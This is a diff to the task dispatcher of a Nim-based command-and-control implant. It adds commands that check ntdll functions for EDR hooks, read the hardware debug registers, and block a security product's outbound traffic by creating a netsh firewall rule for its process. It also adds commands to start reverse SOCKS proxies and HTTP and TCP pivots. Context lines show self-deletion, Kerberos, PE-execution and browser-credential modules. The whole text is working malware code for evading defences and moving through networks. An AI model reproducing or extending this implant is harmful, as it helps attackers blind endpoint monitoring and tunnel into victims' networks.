@@ -1,7 +1,7 @@
 ## Command dispatcher for Nim agent.
 import winim/lean, winim/inc/tlhelp32
 import std/[os, osproc, strutils, strformat, json, random, base64, sequtils]
-import config, transport, evasion, kerberos, pe_exec, browsercreds, dotnet
+import config, transport, evasion, kerberos, pe_exec, browsercreds, dotnet, rsocks, http_pivot, tcp_pivot
 
 var sleepSecDyn* = SleepSec
 var jitterDyn*   = JitterPct
@@ -1387,5 +1387,126 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     if pi.hProcess != 0: discard CloseHandle(pi.hProcess); discard CloseHandle(pi.hThread)
     t.sendResult(id, "[+] scheduled self-delete; exiting", "")
     quit(0)
+  of "HOOK_CHECK":
+    const hookFns = [
+      ("ntdll.dll",    "NtOpenProcess"),
+      ("ntdll.dll",    "NtAllocateVirtualMemory"),
+      ("ntdll.dll",    "NtWriteVirtualMemory"),
+      ("ntdll.dll",    "NtCreateThreadEx"),
+      ("ntdll.dll",    "NtProtectVirtualMemory"),
+      ("ntdll.dll",    "NtReadVirtualMemory"),
+      ("ntdll.dll",    "NtQueueApcThread"),
+      ("ntdll.dll",    "NtCreateSection"),
+      ("ntdll.dll",    "NtMapViewOfSection"),
+      ("ntdll.dll",    "NtUnmapViewOfSection"),
+      ("ntdll.dll",    "NtSuspendThread"),
+      ("ntdll.dll",    "NtResumeThread"),
+      ("ntdll.dll",    "NtGetContextThread"),
+      ("ntdll.dll",    "NtSetContextThread"),
+    ]
+    var sb = "[HOOK_CHECK]\n"
+    for (dll, fn) in hookFns:
+      let hMod = GetModuleHandleA(dll)
+      if hMod == 0:
+        sb.add("  MISS  " & dll & "!" & fn & " (module not loaded)\n")
+        continue
+      let fnPtr = GetProcAddress(hMod, fn)
+      if fnPtr == nil:
+        sb.add("  MISS  " & dll & "!" & fn & " (export not found)\n")
+        continue
+      let b = cast[ptr byte](fnPtr)[]
+      let status = case b
+        of 0xE9: "HOOKED (JMP)"
+        of 0xE8: "HOOKED (CALL)"
+        of 0xCC: "HOOKED (INT3)"
+        else:    "clean (0x" & b.int.toHex(2) & ")"
+      sb.add("  " & (if b in [0xE9'u8, 0xE8'u8, 0xCC'u8]: "!" else: " ") & "     " & dll & "!" & fn & " → " & status & "\n")
+    t.sendResult(id, sb, "")
+  of "HW_BP_CHECK":
+    let hThread = OpenThread(THREAD_GET_CONTEXT or THREAD_SET_CONTEXT, 0, GetCurrentThreadId())
+    if hThread == 0:
+      t.sendResult(id, "", "HW_BP_CHECK: OpenThread failed (err " & $GetLastError() & ")")
+    else:
+      var ctx: CONTEXT
+      zeroMem(addr ctx, sizeof(ctx))
+      ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
+      if GetThreadContext(hThread, addr ctx) == 0:
+        discard CloseHandle(hThread)
+        t.sendResult(id, "", "HW_BP_CHECK: GetThreadContext failed")
+      else:
+        discard CloseHandle(hThread)
+        let dr0 = ctx.Dr0; let dr1 = ctx.Dr1; let dr2 = ctx.Dr2; let dr3 = ctx.Dr3
+        let any = dr0 or dr1 or dr2 or dr3
+        var sb2 = "[HW_BP_CHECK] " & (if any != 0: "DETECTED" else: "clean") & "\n"
+        sb2.add("  DR0=0x" & dr0.int64.toHex(16) & "\n")
+        sb2.add("  DR1=0x" & dr1.int64.toHex(16) & "\n")
+        sb2.add("  DR2=0x" & dr2.int64.toHex(16) & "\n")
+        sb2.add("  DR3=0x" & dr3.int64.toHex(16) & "\n")
+        t.sendResult(id, sb2, "")
+  of "EDR_SILENCE":
+    try:
+      let j = parseJson(args)
+      let pid = j{"pid"}.getInt(0)
+      if pid == 0:
+        t.sendResult(id, "", "EDR_SILENCE requires {pid:N}")
+      else:
+        let pathCmd = "powershell -NoProfile -NonInteractive -Command \"(Get-Process -Id " & $pid & ").Path\""
+        let procPath = runShell(pathCmd).strip()
+        if procPath == "" or not procPath.toLowerAscii().endsWith(".exe"):
+          t.sendResult(id, "", "EDR_SILENCE: could not resolve path for PID " & $pid)
+        else:
+          let ruleName = "EDRSilence_" & $pid
+          let netshCmd = "netsh advfirewall firewall add rule name=\"" & ruleName &
+            "\" dir=out action=block program=\"" & procPath & "\" enable=yes"
+          let out2 = runShell(netshCmd)
+          t.sendResult(id, "[+] EDR_SILENCE pid=" & $pid & " path=" & procPath & "\n" & out2, "")
+    except: t.sendResult(id, "", "EDR_SILENCE: " & getCurrentExceptionMsg())
+  of "EDR_SILENCE_RM":
+    try:
+      let j = parseJson(args)
+      let pid = j{"pid"}.getInt(0)
+      if pid == 0:
+        t.sendResult(id, "", "EDR_SILENCE_RM requires {pid:N}")
+      else:
+        let ruleName = "EDRSilence_" & $pid
+        let out2 = runShell("netsh advfirewall firewall delete rule name=\"" & ruleName & "\"")
+        t.sendResult(id, "[+] rule removed: " & ruleName & "\n" & out2, "")
+    except: t.sendResult(id, "", "EDR_SILENCE_RM: " & getCurrentExceptionMsg())
+  of "RSOCKS_START":
+    let port = args.strip()
+    if port == "":
+      t.sendResult(id, "", "RSOCKS_START requires callback port number")
+    else:
+      t.sendResult(id, startRSocks(port), "")
+  of "RSOCKS_STOP":
+    t.sendResult(id, stopRSocks(), "")
+  of "HTTP_PIVOT_START":
+    try:
+      let j = parseJson(args)
+      let port = j{"port"}.getInt(0)
+      if port == 0:
+        t.sendResult(id, "", "HTTP_PIVOT_START requires {port:N}")
+      else:
+        gHttpPivotAgentID = t.agentId
+        t.sendResult(id, startHttpPivot(port), "")
+    except: t.sendResult(id, "", "HTTP_PIVOT_START: " & getCurrentExceptionMsg())
+  of "HTTP_PIVOT_STOP":
+    t.sendResult(id, stopHttpPivot(), "")
+  of "TCP_PIVOT_START":
+    try:
+      let j = parseJson(args)
+      let port = j{"port"}.getInt(0)
+      if port == 0:
+        t.sendResult(id, "", "TCP_PIVOT_START requires {port:N}")
+      else:
+        gTcpPivotAgentID = t.agentId
+        t.sendResult(id, startTcpPivot(port), "")
+    except: t.sendResult(id, "", "TCP_PIVOT_START: " & getCurrentExceptionMsg())
+  of "TCP_PIVOT_STOP":
+    try:
+      let j = parseJson(args)
+      let port = j{"port"}.getInt(0)
+      t.sendResult(id, stopTcpPivot(port), "")
+    except: t.sendResult(id, stopTcpPivot(0), "")
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
